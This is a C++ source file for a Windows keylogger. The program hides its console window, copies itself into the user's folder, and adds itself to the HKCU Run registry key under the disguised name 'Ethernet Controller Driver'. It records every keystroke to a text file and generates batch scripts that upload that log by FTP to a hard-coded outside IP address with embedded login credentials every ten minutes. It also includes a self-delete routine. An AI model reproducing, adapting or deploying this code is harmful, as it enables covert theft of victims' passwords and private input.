#include <iostream> 
using namespace std; 
#include <windows.h> 
#include <Lmcons.h>
#include <winuser.h> 
#include<string>
#include<time.h>
#include <fstream>
#include <strsafe.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include<bits/stdc++.h>
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"")
char result[1000];
time_t t;
char username[UNLEN+1];
int Save (int key_stroke, char const *file);
void Stealth();
TCHAR szPath[MAX_PATH];
DWORD pathLen = 0;

void DelMe()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int startupdude()
{
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
if (pathLen == 0)
{
    return -1;
}
HKEY newValue;
if (RegOpenKey(HKEY_CURRENT_USER,
    TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
    &newValue) != ERROR_SUCCESS)
{
    return -1;
}
DWORD pathLenInBytes = pathLen * sizeof(*szPath);
if (RegSetValueEx(newValue,
    TEXT("Ethernet Controller Driver"),
    0,
    REG_SZ,
    (LPBYTE)szPath,
    pathLenInBytes) != ERROR_SUCCESS)
{
    RegCloseKey(newValue);
    return -1;
}
RegCloseKey(newValue);
return TRUE;
}


int main(int argc, char *argv[])
{
	DWORD username_len = UNLEN+1;
GetUserName(username, &username_len);


const char *sree;
sree="C:\\Users\\";
 char disket[1000];
strcpy(result,sree);
strcat(result,username); 
sree="\\contacts";
strcat(result,sree);
strcpy(disket,result);
const char *sreeadd="\\sree2.bat";
strcat(result,sreeadd);
 ofstream batch;
 batch.open(result, ios::out);
batch <<"open 31.170.164.71\n";
batch <<"u518985586.devudaa\n";
batch <<"DevudaaDevudaa\n";
batch <<"cd logs\n";
batch <<"lcd ";
batch <<disket;
batch <<"\n";
batch <<"put\n";
batch <<"rev.txt\n";
batch <<username;
batch <<".txt\n";
batch <<"close\n";
batch << "bye\n";
batch <<"exit\n";
batch.close();
sreeadd="\\sree1.bat";
strcpy(result,disket);
strcat(result,sreeadd);
batch.open(result, ios::out);
string d="ftp -s:";
d=d+disket+"\\sree2.bat\n";
batch <<d;
batch.close();
//system(result);// remember result to be called inside....always
sreeadd="\\rev.txt";
char hell[1000];
strcpy(hell,disket);
strcat(hell,sreeadd);
		FILE *fptr;
    fptr = fopen(hell, "w");




Stealth(); 
char g[1000];
strcpy(g,disket);
sreeadd="\\DHCP_Client.exe";
strcat(g,sreeadd);
char b[1000];
sreeadd="copy DHCP_Client.exe ";
strcpy(b,sreeadd);
strcat(b,disket);
ifstream file(g);
ifstream file2("rev.txt");
int fl=0;

if(file)
{
	startupdude();
char i;
time(&t);
	long long l;
	l=t+20;
//system(result);
while (1)
{

	

for(i = 8; i <= 190; i++)
{
		time(&t);
if (GetAsyncKeyState(i) == -32767)
	{
		Save (i,hell); 
	//	system(result);
	}
if(t>=l)
	{
		system(result);
		time(&t);
		l=t+600;
	}	
}

}
system ("PAUSE");
FreeConsole();
return 0;
}
else 
{
	system(b);
	
	system(g);
}
}

/* *********************************** */

int Save (int key_stroke, char const *file)
{
if ( (key_stroke == 1) || (key_stroke == 2) )
return 0;

FILE *OUTPUT_FILE;
OUTPUT_FILE = fopen(file, "a+");

cout << key_stroke << endl;

if (key_stroke == 8)
fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]"); 
else if (key_stroke == 13)
fprintf(OUTPUT_FILE, "%s", "\n"); 
else if (key_stroke == 32)
fprintf(OUTPUT_FILE, "%s", " ");
else if (key_stroke == VK_TAB) 
fprintf(OUTPUT_FILE, "%s", "[TAB]");
else if (key_stroke == VK_SHIFT)
fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
else if (key_stroke == VK_CONTROL)
fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
else if (key_stroke == VK_ESCAPE)
fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
else if (key_stroke == VK_END)
fprintf(OUTPUT_FILE, "%s", "[END]");
else if (key_stroke == VK_HOME)
fprintf(OUTPUT_FILE, "%s", "[HOME]");
else if (key_stroke == VK_LEFT)
fprintf(OUTPUT_FILE, "%s", "[LEFT]");
else if (key_stroke == VK_UP)
fprintf(OUTPUT_FILE, "%s", "[UP]");
else if (key_stroke == VK_RIGHT)
fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
else if (key_stroke == VK_DOWN)
fprintf(OUTPUT_FILE, "%s", "[DOWN]");
else if (key_stroke == 190 || key_stroke == 110)
fprintf(OUTPUT_FILE, "%s", ".");
else
fprintf(OUTPUT_FILE, "%s", &key_stroke);

fclose (OUTPUT_FILE);
return 0;
}
void Stealth()
{
HWND Stealth;
AllocConsole();
Stealth = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(Stealth,false);
} 


